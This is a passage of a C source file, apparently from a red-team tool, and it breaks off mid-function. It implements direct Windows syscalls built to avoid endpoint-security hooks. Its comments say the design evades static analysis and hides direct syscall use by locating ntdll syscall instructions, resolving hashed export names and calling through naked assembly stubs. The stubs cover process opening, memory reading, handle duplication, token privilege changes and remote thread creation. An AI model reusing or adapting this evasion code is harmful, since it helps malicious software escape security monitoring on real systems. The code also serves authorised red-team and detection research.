#include "syscalls.h"

// Code below is adapted from @modexpblog. Read linked article for more details.
// https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams

#if defined(_MSC_VER)
#if defined(BOF)
#pragma data_seg(".data")
#endif
SW2_SYSCALL_LIST SW2_SyscallList;
#if defined(BOF)
#pragma data_seg(".data")
#endif
#elif defined(__GNUC__) && defined(BOF)
SW2_SYSCALL_LIST SW2_SyscallList __attribute__ ((section(".data")));
#elif defined(__GNUC__)
SW2_SYSCALL_LIST SW2_SyscallList;
#endif
/*
 * If no 'syscall' instruction is found in NTDLL,
 * this function will be called.
 * By default just returns STATUS_NOT_FOUND.
 * The idea is to avoid having a 'syscall' instruction
 * on this program's .text section to evade static analysis
 */
#if defined(_MSC_VER) && defined (_M_IX86)

__declspec(naked) void SyscallNotFound(void)
{
    __asm {
        mov eax, 0xC0DEDEAD
        ret
    }
}

#elif defined(__GNUC__)

__declspec(naked) void SyscallNotFound(void)
{
    asm(
        SET_SYNTAX
        "mov eax, 0xC0DEDEAD \n"
        "ret \n"
    );
}
#endif

PVOID get_ntopenprocess_syscall_address(VOID)
{
    return SW3_GetSyscallAddress(ZwOpenProcess_SW2_HASH);
}

/*
 * the idea here is to find a 'syscall' instruction in 'ntdll.dll'
 * so that we can call it from our code and try to hide the fact
 * that we use direct syscalls
 */
PVOID GetSyscallAddress(
    IN PVOID nt_api_address,
    IN ULONG32 size_of_ntapi)
{
    PVOID syscall_address = NULL;
#ifdef _WIN64
    BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
#else
    BYTE syscall_code[] = { 0x0f, 0x34, 0xc3 };
#endif

    // we will loook for a syscall;ret up to the end of the api
    ULONG32 max_look_range = size_of_ntapi - sizeof(syscall_code) + 1;

#ifdef _M_IX86
    if (local_is_wow64())
    {
        // if we are a WoW64 process, jump to WOW32Reserved
        syscall_address = (PVOID)READ_MEMLOC(0xc0);
        return syscall_address;
    }
#endif

    for (ULONG32 offset = 0; offset < max_look_range; offset++)
    {
        // we don't really care if there is a 'jmp' between
        // nt_api_address and the 'syscall; ret' instructions
        syscall_address = SW2_RVA2VA(PVOID, nt_api_address, offset);

        if (!memcmp((PVOID)syscall_code, syscall_address, sizeof(syscall_code)))
        {
            // we can use the original code for this system call :)
            return syscall_address;
        }
    }

    // the 'syscall; ret' intructions have not been found,
    // we will try to use one near it, similarly to HalosGate

    for (ULONG32 num_jumps = 1; num_jumps < SW2_MAX_ENTRIES; num_jumps++)
    {
        // let's try with an Nt* API below our syscall
        for (ULONG32 offset = 0; offset < max_look_range; offset++)
        {
            syscall_address = SW2_RVA2VA(
                PVOID,
                nt_api_address,
                offset + num_jumps * size_of_ntapi);
            if (!memcmp((PVOID)syscall_code, syscall_address, sizeof(syscall_code)))
                return syscall_address;
        }

        // let's try with an Nt* API above our syscall
        for (ULONG32 offset = 0; offset < max_look_range; offset++)
        {
            syscall_address = SW2_RVA2VA(
                PVOID,
                nt_api_address,
                offset - num_jumps * size_of_ntapi);
            if (!memcmp((PVOID)syscall_code, syscall_address, sizeof(syscall_code)))
                return syscall_address;
        }
    }

    return SyscallNotFound;
}

DWORD SW2_HashSyscall(
    IN PCSTR FunctionName)
{
    DWORD i = 0;
    DWORD Hash = SW2_SEED;

    while (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
        Hash ^= PartialName + SW2_ROR8(Hash);
    }

    return Hash;
}

BOOL SW2_PopulateSyscallList(VOID)
{
    // Return early if the list is already populated.
    if (SW2_SyscallList.Count) return TRUE;

    PSW2_PEB Peb = (PSW2_PEB)READ_MEMLOC(PEB_OFFSET);
    PSW2_PEB_LDR_DATA Ldr = Peb->Ldr;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
    PVOID DllBase = NULL;

    // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
    // in the list, so it's safer to loop through the full list and find it.
    PSW2_LDR_DATA_TABLE_ENTRY LdrEntry;
    for (LdrEntry = (PSW2_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW2_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
    {
        DllBase = LdrEntry->DllBase;
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
        PIMAGE_NT_HEADERS NtHeaders = SW2_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (VirtualAddress == 0) continue;

        ExportDirectory = SW2_RVA2VA(PIMAGE_EXPORT_DIRECTORY, DllBase, VirtualAddress);

        // If this is NTDLL.dll, exit loop.
        PCHAR DllName = SW2_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);
        if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
        if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c) break;
    }

    if (!ExportDirectory) return FALSE;

    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
    PDWORD Functions = SW2_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
    PDWORD Names = SW2_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
    PWORD Ordinals = SW2_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

    // Populate SW2_SyscallList with unsorted Zw* entries.
    DWORD i = 0;
    PSW2_SYSCALL_ENTRY Entries = SW2_SyscallList.Entries;
    do
    {
        PCHAR FunctionName = SW2_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);

        // Is this a system call?
        if (*(USHORT*)FunctionName == 0x775a)
        {
            Entries[i].Hash = SW2_HashSyscall(FunctionName);
            Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];

            i++;
            if (i == SW2_MAX_ENTRIES) break;
        }
    } while (--NumberOfNames);

    // Save total number of system calls found.
    SW2_SyscallList.Count = i;

    // Sort the list by address in ascending order.
    for (i = 0; i < SW2_SyscallList.Count - 1; i++)
    {
        for (DWORD j = 0; j < SW2_SyscallList.Count - i - 1; j++)
        {
            if (Entries[j].Address > Entries[j + 1].Address)
            {
                // Swap entries.
                SW2_SYSCALL_ENTRY TempEntry = { 0 };

                TempEntry.Hash = Entries[j].Hash;
                TempEntry.Address = Entries[j].Address;

                Entries[j].Hash = Entries[j + 1].Hash;
                Entries[j].Address = Entries[j + 1].Address;

                Entries[j + 1].Hash = TempEntry.Hash;
                Entries[j + 1].Address = TempEntry.Address;
            }
        }
    }

    // we need to know this in order to better search for syscall ids
    ULONG size_of_ntapi = Entries[1].Address - Entries[0].Address;

    // finally calculate the address of each syscall
    for (i = 0; i < SW2_SyscallList.Count - 1; i++)
    {
        PVOID nt_api_address = SW2_RVA2VA(PVOID, DllBase, Entries[i].Address);
        Entries[i].SyscallAddress = GetSyscallAddress(nt_api_address, size_of_ntapi);
    }

    return TRUE;
}

EXTERN_C DWORD SW2_GetSyscallNumber(
    IN DWORD FunctionHash)
{
    if (!SW2_PopulateSyscallList())
    {
        DPRINT_ERR("SW2_PopulateSyscallList failed");
        return 0;
    }

    for (DWORD i = 0; i < SW2_SyscallList.Count; i++)
    {
        if (FunctionHash == SW2_SyscallList.Entries[i].Hash)
        {
            return i;
        }
    }
    DPRINT_ERR("syscall with hash 0x%lx not found", FunctionHash);
    return 0;
}

EXTERN_C PVOID SW3_GetSyscallAddress(
    IN DWORD FunctionHash)
{
    if (!SW2_PopulateSyscallList())
    {
        DPRINT_ERR("SW2_PopulateSyscallList failed");
        return NULL;
    }

    for (DWORD i = 0; i < SW2_SyscallList.Count; i++)
    {
        if (FunctionHash == SW2_SyscallList.Entries[i].Hash)
        {
            return SW2_SyscallList.Entries[i].SyscallAddress;
        }
    }
    DPRINT_ERR("syscall with hash 0x%lx not found", FunctionHash);
    return NULL;
}

#if defined(_MSC_VER) && defined (_M_IX86)

__declspec(naked) BOOL local_is_wow64(void)
{
    __asm {
        mov eax, fs:[0xc0]
        test eax, eax
        jne wow64
        mov eax, 0
        ret
        wow64:
        mov eax, 1
        ret
    }
}

__declspec(naked) PVOID getIP(void)
{
    __asm {
        mov eax, [esp]
        ret
    }
}

__declspec(naked) NTSTATUS NtOpenProcess(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PCLIENT_ID ClientId OPTIONAL)
{
    __asm {
        push 0xCD9B2A0F
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtGetNextProcess(
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Flags,
    OUT PHANDLE NewProcessHandle)
{
    __asm {
        push 0xFFBF1A2F
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtReadVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT PSIZE_T NumberOfBytesRead OPTIONAL)
{
    __asm {
        push 0x118B7567
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtClose(
    IN HANDLE Handle)
{
    __asm {
        push 0x2252D33F
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtOpenProcessToken(
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    OUT PHANDLE TokenHandle)
{
    __asm {
        push 0x8FA915A2
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtQueryInformationProcess(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL)
{
    __asm {
        push 0xBDBCBC20
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtQueryVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN MEMORY_INFORMATION_CLASS MemoryInformationClass,
    OUT PVOID MemoryInformation,
    IN SIZE_T MemoryInformationLength,
    OUT PSIZE_T ReturnLength OPTIONAL)
{
    __asm {
        push 0x0393E980
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtAdjustPrivilegesToken(
    IN HANDLE TokenHandle,
    IN BOOLEAN DisableAllPrivileges,
    IN PTOKEN_PRIVILEGES NewState OPTIONAL,
    IN ULONG BufferLength,
    OUT PTOKEN_PRIVILEGES PreviousState OPTIONAL,
    OUT PULONG ReturnLength OPTIONAL)
{
    __asm {
        push 0x17AB1B32
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID * BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect)
{
    __asm {
        push 0x0595031B
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtFreeVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID * BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG FreeType)
{
    __asm {
        push 0x01932F05
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtCreateFile(
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER AllocationSize OPTIONAL,
    IN ULONG FileAttributes,
    IN ULONG ShareAccess,
    IN ULONG CreateDisposition,
    IN ULONG CreateOptions,
    IN PVOID EaBuffer OPTIONAL,
    IN ULONG EaLength)
{
    __asm {
        push 0x96018EB6
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtWriteFile(
    IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length,
    IN PLARGE_INTEGER ByteOffset OPTIONAL,
    IN PULONG Key OPTIONAL)
{
    __asm {
        push 0x24B22A1A
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtCreateProcessEx(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    IN HANDLE SectionHandle OPTIONAL,
    IN HANDLE DebugPort OPTIONAL,
    IN HANDLE ExceptionPort OPTIONAL,
    IN ULONG JobMemberLevel)
{
    __asm {
        push 0x1198E2E3
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtQuerySystemInformation(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL)
{
    __asm {
        push 0x4A5B2C8F
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtDuplicateObject(
    IN HANDLE SourceProcessHandle,
    IN HANDLE SourceHandle,
    IN HANDLE TargetProcessHandle OPTIONAL,
    OUT PHANDLE TargetHandle OPTIONAL,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Options)
{
    __asm {
        push 0x9CBFA413
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtQueryObject_(
    IN HANDLE Handle,
    IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
    OUT PVOID ObjectInformation OPTIONAL,
    IN ULONG ObjectInformationLength,
    OUT PULONG ReturnLength OPTIONAL)
{
    __asm {
        push 0x0E23F64F
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtWaitForSingleObject(
    IN HANDLE ObjectHandle,
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER TimeOut OPTIONAL)
{
    __asm {
        push 0x426376E3
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtDeleteFile(
    IN POBJECT_ATTRIBUTES ObjectAttributes)
{
    __asm {
        push 0x64B26A1A
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtTerminateProcess(
    IN HANDLE ProcessHandle OPTIONAL,
    IN NTSTATUS ExitStatus)
{
    __asm {
        push 0x652E64A0
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtSetInformationProcess_(
    IN HANDLE DeviceHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    IN PVOID ProcessInformation,
    IN ULONG Length)
{
    __asm {
        push 0x1D9F320C
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtQueryInformationToken(
    IN HANDLE TokenHandle,
    IN TOKEN_INFORMATION_CLASS TokenInformationClass,
    OUT PVOID TokenInformation,
    IN ULONG TokenInformationLength,
    OUT PULONG ReturnLength)
{
    __asm {
        push 0x27917136
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtDuplicateToken(
    IN HANDLE ExistingTokenHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN BOOLEAN EffectiveOnly,
    IN TOKEN_TYPE TokenType,
    OUT PHANDLE NewTokenHandle)
{
    __asm {
        push 0x099C8384
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtSetInformationThread(
    IN HANDLE ThreadHandle,
    IN THREADINFOCLASS ThreadInformationClass,
    IN PVOID ThreadInformation,
    IN ULONG ThreadInformationLength)
{
    __asm {
        push 0x1ABE5F87
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtCreateDirectoryObjectEx(
    OUT PHANDLE DirectoryHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ShadowDirectoryHandle,
    IN ULONG Flags)
{
    __asm {
        push 0xBCBD62EA
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtCreateSymbolicLinkObject(
    OUT PHANDLE LinkHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PUNICODE_STRING LinkTarget)
{
    __asm {
        push 0x8AD1BA6D
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtOpenSymbolicLinkObject(
    OUT PHANDLE LinkHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes)
{
    __asm {
        push 0x8C97980F
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtQuerySymbolicLinkObject(
    IN HANDLE LinkHandle,
    IN OUT PUNICODE_STRING LinkTarget,
    OUT PULONG ReturnedLength OPTIONAL)
{
    __asm {
        push 0xA63A8CA7
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtCreateSection(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL)
{
    __asm {
        push 0xF06912F9
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtOpenThreadToken(
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN BOOLEAN OpenAsSelf,
    OUT PHANDLE TokenHandle)
{
    __asm {
        push 0x73A33918
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtCreateTransaction(
    OUT PHANDLE TransactionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN LPGUID Uow OPTIONAL,
    IN HANDLE TmHandle OPTIONAL,
    IN ULONG CreateOptions OPTIONAL,
    IN ULONG IsolationLevel OPTIONAL,
    IN ULONG IsolationFlags OPTIONAL,
    IN PLARGE_INTEGER Timeout OPTIONAL,
    IN PUNICODE_STRING Description OPTIONAL)
{
    __asm {
        push 0x7CAB5EFB
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtQueryInformationFile(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass)
{
    __asm {
        push 0x38985C1E
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtMakeTemporaryObject(
    IN HANDLE Handle)
{
    __asm {
        push 0x84DF4D82
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtCreateKey(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG TitleIndex,
    IN PUNICODE_STRING Class OPTIONAL,
    IN ULONG CreateOptions,
    OUT PULONG Disposition OPTIONAL)
{
    __asm {
        push 0xA1B2860C
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtSetValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN ULONG TitleIndex OPTIONAL,
    IN ULONG Type,
    IN PVOID SystemData,
    IN ULONG DataSize)
{
    __asm {
        push 0x0A1F2D80
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtQueryWnfStateNameInformation(
    IN PVOID StateName,
    IN ULONG NameInfoClass,
    IN PVOID ExplicitScope OPTIONAL,
    OUT PVOID InfoBuffer,
    IN ULONG InfoBufferSize)
{
    __asm {
        push 0x14823613
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtUpdateWnfStateData(
    IN PVOID StateName,
    IN PVOID Buffer OPTIONAL,
    IN ULONG Length OPTIONAL,
    IN PCWNF_TYPE_ID TypeId OPTIONAL,
    IN PVOID ExplicitScope OPTIONAL,
    IN WNF_CHANGE_STAMP MatchingChangeStamp,
    IN ULONG CheckStamp)
{
    __asm {
        push 0xE63DF28A
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtOpenEvent(
    OUT PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes)
{
    __asm {
        push 0x32A83D3A
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtAlpcConnectPort(
    OUT PHANDLE PortHandle,
    IN PUNICODE_STRING PortName,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PALPC_PORT_ATTRIBUTES PortAttributes OPTIONAL,
    IN ULONG Flags,
    IN PSID RequiredServerSid OPTIONAL,
    IN OUT PVOID ConnectionMessage OPTIONAL,
    IN OUT PULONG BufferLength OPTIONAL,
    IN OUT PALPC_MESSAGE_ATTRIBUTES OutMessageAttributes OPTIONAL,
    IN OUT PALPC_MESSAGE_ATTRIBUTES InMessageAttributes OPTIONAL,
    IN PLARGE_INTEGER Timeout OPTIONAL)
{
    __asm {
        push 0x6AF3595C
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtAlpcSendWaitReceivePort(
    IN HANDLE PortHandle,
    IN ULONG Flags,
    IN PPORT_MESSAGE SendMessage OPTIONAL,
    IN OUT PALPC_MESSAGE_ATTRIBUTES SendMessageAttributes OPTIONAL,
    OUT PPORT_MESSAGE ReceiveMessage OPTIONAL,
    IN OUT PSIZE_T BufferLength OPTIONAL,
    IN OUT PALPC_MESSAGE_ATTRIBUTES ReceiveMessageAttributes OPTIONAL,
    IN PLARGE_INTEGER Timeout OPTIONAL)
{
    __asm {
        push 0xE830236E
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtCreateThreadEx(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL)
{
    __asm {
        push 0x113F55E3
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtDeleteKey(
    IN HANDLE KeyHandle)
{
    __asm {
        push 0x6BDA0E04
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtPrivilegeCheck(
    IN HANDLE ClientToken,
    IN OUT PPRIVILEGE_SET RequiredPrivileges,
    OUT PBOOL Result)
{
    __asm {
        push 0x12B1DE10
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtCreateEvent(
    OUT PHANDLE EventHandle,
